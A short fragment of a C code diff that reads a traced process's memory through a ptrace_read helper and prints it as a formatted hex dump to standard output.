+		for (i = 0; i < memLen; i++)
+		{
+			if (i > 0 && 0 == i % 16)
+			{
+				fprintf(stdout, "\n");
+			}
+			else if (i > 0 && 0 == i % 2)
+			{
+				fprintf(stdout, " ");
+			}
+
+			ptrace_read(pid, ((unsigned long)mem_ptr) + i, &readBytes, sizeof(long));
+
+			readByte = 0;
+			readByte |= *(&readBytes + j);
+			fprintf(stdout, "%02X", (unsigned int)readByte & 0xFF);
+		}
+
+		fprintf(stdout, "\n");
+	}
+
+	// DONE
+	return;
 }
